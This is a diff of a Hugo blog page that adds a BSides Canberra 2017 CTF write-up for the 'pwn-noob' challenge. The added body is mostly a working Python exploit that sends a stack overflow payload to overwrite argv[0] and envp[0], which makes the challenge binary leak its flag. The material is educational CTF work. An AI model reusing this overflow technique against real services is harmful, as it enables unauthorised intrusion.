@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html lang="en-AU">
   <head>
-    <meta name="generator" content="Hugo 0.20.2" />
+    <meta name="generator" content="Hugo 0.20.5" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BSides Canberra pwn-noob CTF Writeup | 0xbc&#39;s blog</title>
+    <title>BSides Canberra pwn-noob CTF Write-up | 0xbc&#39;s blog</title>
     <meta name="description" content="A writeup for the pwn-noob exploit challenge at the BSides Canberra 2017 CTF">
-    <meta name="keywords" content="linux, exploitation">
+    <meta name="keywords" content="linux, binary-exploitation">
     
     
     
@@ -16,7 +16,7 @@
   <meta name="author" content="Ben Cheney">
 
 
-    <meta property="og:title" content="BSides Canberra pwn-noob CTF Writeup" />
+    <meta property="og:title" content="BSides Canberra pwn-noob CTF Write-up" />
 <meta property="og:description" content="A writeup for the pwn-noob exploit challenge at the BSides Canberra 2017 CTF" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://0xbc.blog/post/bsides-cbr-pwn-noob-writeup/" />
@@ -143,19 +143,19 @@ article [itemprop="description"] {
     <main>
   <article itemscope itemtype="http://schema.org/BlogPosting">
     
-<meta itemprop="name" content="BSides Canberra pwn-noob CTF Writeup">
+<meta itemprop="name" content="BSides Canberra pwn-noob CTF Write-up">
 <meta itemprop="description" content="A writeup for the pwn-noob exploit challenge at the BSides Canberra 2017 CTF">
 
 
 <meta itemprop="dateModified" content="2017-04-25T21:53:48&#43;09:30" />
-<meta itemprop="wordCount" content="59">
+<meta itemprop="wordCount" content="213">
 
 
 
-<meta itemprop="keywords" content="ctf,writeups,exploitation,linux," />
+<meta itemprop="keywords" content="ctf-writeups,binary-exploitation,linux," />
 
     <header>
-      <h1 itemprop="headline">BSides Canberra pwn-noob CTF Writeup</h1>
+      <h1 itemprop="headline">BSides Canberra pwn-noob CTF Write-up</h1>
       <p class="muted">
         <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
   <circle cx="16" cy="16" r="14" />
@@ -177,12 +177,68 @@ article [itemprop="description"] {
     
 
     <div itemprop="articleBody">
-      <p>Before you continue, please take a moment to configure your archetypes.</p>
-
-<p>Archetypes are located in the <code>archetypes</code> directory in the source of your site. To learn more about archetypes, visit <a href="https://gohugo.io/content/archetypes/">Archetypes</a> on the Hugo website. And when you&rsquo;re ready, check out the <a href="https://comfusion.github.io/after-dark/#customizing">Customizing</a> section of the After Dark documentation for additional options.</p>
+      <p>Coming soon&hellip;</p>
 
 <p>
-This information appears below the <a href="https://gohugo.io/content/summaries/">Summary Split</a>.</p>
+<img src="/img/pwn-noob-main.png" style="width:100%"/>Disassembly</img> is fun!</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">import</span> <span style="color: #f8f8f2">socket</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">struct</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">sys</span>
+ 
+<span style="color: #75715e"># pwn-noob.py</span>
+<span style="color: #75715e"># exploit for https://github.com/OJ/bsides-2017-ctf-docker/tree/master/pwn-noob</span>
+ 
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">p</span><span style="color: #f8f8f2">(addr):</span>
+    <span style="color: #75715e"># encode addresses as 64-bit little-endian</span>
+    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">struct</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">pack(</span><span style="color: #e6db74">&quot;&lt;Q&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">addr)</span>
+ 
+<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">len(sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv)</span> <span style="color: #f92672">&gt;</span> <span style="color: #ae81ff">3</span><span style="color: #f8f8f2">:</span>
+    <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;Usage: pwn-noob.py [host] [port] (defaults to localhost 6000)&quot;</span>
+    <span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">exit()</span>
+<span style="color: #66d9ef">elif</span> <span style="color: #f8f8f2">len(sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">3</span><span style="color: #f8f8f2">:</span>
+    <span style="color: #f8f8f2">host</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span>
+    <span style="color: #f8f8f2">port</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">int(sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">])</span>
+<span style="color: #66d9ef">elif</span> <span style="color: #f8f8f2">len(sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">2</span><span style="color: #f8f8f2">:</span>
+    <span style="color: #f8f8f2">host</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span>
+    <span style="color: #f8f8f2">port</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">6000</span>
+<span style="color: #66d9ef">elif</span> <span style="color: #f8f8f2">len(sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">argv)</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">:</span>
+    <span style="color: #f8f8f2">host</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;localhost&#39;</span>
+    <span style="color: #f8f8f2">port</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">6000</span>
+ 
+<span style="color: #f8f8f2">envstring</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;TERM=a&#39;</span>   <span style="color: #75715e"># it doesn&#39;t actually matter what you set TERM to,</span>
+                       <span style="color: #75715e"># so long as it&#39;s set</span>
+
+<span style="color: #f8f8f2">flag_addr</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0x400800</span>   <span style="color: #75715e"># determined by inspecting the binary</span>
+
+<span style="color: #f8f8f2">buffer_addr</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0x601040</span> <span style="color: #75715e"># determined by inspecting the binary</span>
+
+<span style="color: #f8f8f2">flag_start_len</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">264</span>   <span style="color: #75715e"># determined by trial-and-error</span>
+
+<span style="color: #f8f8f2">envp_start_len</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">8</span>     <span style="color: #75715e"># skip over 8 bytes of NULL at the end of </span>
+                       <span style="color: #75715e"># the argv array to get to envp[0]</span>
+ 
+<span style="color: #75715e"># newlines required to finish calls to fgets (0x4006e9, 0x40072e)</span>
+<span style="color: #f8f8f2">payload1</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">envstring</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&#39;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&#39;</span>
+<span style="color: #f8f8f2">payload2</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;A&#39;</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">flag_start_len</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">p(flag_addr)</span> <span style="color: #f92672">+</span> 
+            <span style="color: #e6db74">&#39;B&#39;</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">envp_start_len</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">p(buffer_addr)</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&#39;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&#39;</span>
+ 
+<span style="color: #f8f8f2">s</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">socket(socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">AF_INET,</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">SOCK_STREAM)</span>
+<span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">connect((host,</span> <span style="color: #f8f8f2">port))</span>
+ 
+<span style="color: #75715e"># Print first prompt, send TERM string, which will be stored at buffer_addr</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recv(</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">send(payload1)</span>
+ 
+<span style="color: #75715e"># Print second prompt, send stack-smashing junk + argv[0] overwrite </span>
+<span style="color: #75715e"># + junk + envp[0] overwrite</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recv(</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">)</span>
+<span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">send(payload2)</span>
+ 
+<span style="color: #75715e"># Print out the flag</span>
+<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recv(</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">)</span>
+ 
+<span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">close()</span>
+</pre></div>
     </div>
     
     <footer>
@@ -198,12 +254,12 @@ This information appears below the <a href="https://gohugo.io/content/summaries/
     25 Apr, 2017
   </time>
   
-    in <span itemprop="articleSection"><a href="/categories/ctf/">CTF</a> and <a href="/categories/writeups/">writeups</a></span>
+    in <span itemprop="articleSection"><a href="/categories/ctf-writeups/">ctf-writeups</a></span>
   
   
-    and tagged <a href="/tags/exploitation/">exploitation</a> and <a href="/tags/linux/">linux</a>
+    and tagged <a href="/tags/binary-exploitation/">binary-exploitation</a> and <a href="/tags/linux/">linux</a>
   
-  using <span itemprop="wordCount">59</span> words.
+  using <span itemprop="wordCount">213</span> words.
 </p>
 
       
